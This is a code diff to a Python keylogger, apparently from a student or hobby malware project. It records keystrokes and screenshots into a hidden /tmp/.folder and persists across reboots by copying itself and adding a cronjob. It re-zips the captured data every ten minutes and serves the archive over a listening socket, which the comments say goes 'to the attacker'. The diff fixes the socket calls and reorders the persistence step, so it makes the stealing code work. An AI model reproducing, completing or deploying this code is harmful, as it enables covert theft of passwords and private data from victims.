@@ -67,9 +67,6 @@ class Keylogger:
 		self.initial_file_path = os.getcwd()
 		# get /tmp folder name
 		self.directory = self.make_get_dir()
-		# replicate the initial file into the /tmp/.folder
-		# to continue to execute keylogger after reboot
-		self.replicate()
 
 	'''
 	Begin capturing keystrokes
@@ -77,10 +74,11 @@ class Keylogger:
 	def start_listening(self):
 		with keyboard.Listener(
 			on_press=self.on_press) as listener:
-			# begin logging to keylog file
 			self.log_to_file()
 			# begin taking screen shots
 			self.save_screen()
+			# listen for socket connections and send at zipped file
+			self.socket_listen_send()
 			listener.join()
 
 	'''
@@ -184,36 +182,36 @@ class Keylogger:
 			for file in file_paths:
 				zipped.write(file)
 
-			return zipped
-
+		return zip_name
 	'''
 	send the zipped folder to the attacker
 	Param : zipped file created by zip_folder function
 	'''
 	def socket_listen_send(self):
-		# get zipped file composed of folders contents
-		zipped_file = self.zip_folder(self.directory)
+		# zip file composed of folders contents
+		ziped_name = self.zip_folder(self.directory)
+		# rewrite existing zip file with new contents
+		zip_restart = threading.Timer(600, self.zip_folder)
+		# start zipping clock
+		zip_restart.start()
 		# creating socket context manager
 		with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as soc:
 			# get IP address of victim and assign listening port
 			IP=sck.gethostbyname(sck.gethostname())
-			print(IP)
-			PORT=1945 # the end of ww2
+			PORT=12345
 
 			# bind socket to victim IP address and port
-			sck.bind((IP, PORT))
+			soc.bind((IP, PORT))
 			# listen for incoming connections
-			sck.listen(5)
+			soc.listen(5)
 			# accept and receive connection
-			connection, address = sck.accept()
+			connection, address = soc.accept()
 			# open file to read as bytes
-			with open(zipped_file, 'rb') as zip_file:
-					# read bytes from file
-					content = zip_file.read()
-					# send bytes data over socket
-					connection.send(content)
-					# closing file to end loop
-					zip_file.close()
+			with open('/tmp/.folder/'+ziped_name, 'rb') as zip_file:
+				# read bytes from file
+				content = zip_file.read()
+				# send bytes data over socket
+				connection.send(content)
 
 	'''
 	Create cronjob to startup keyself.logger after reboot
@@ -243,10 +241,12 @@ MAIN IS HERE!
 def initiate():
 	# instantiating object
 	my_obj = Keylogger()
-	# make directory
-	my_obj.make_get_dir()
 	# invoke this function to begin listening
 	my_obj.start_listening()
+	# get path of where the initial file was downloaded
+	# replicate the initial file into the /tmp/.folder
+	# to continue to execute keylogger after reboot
+	my_obj.replicate()
 	# listen for socket connections and send at zipped file
 	my_obj.socket_listen_send()
 
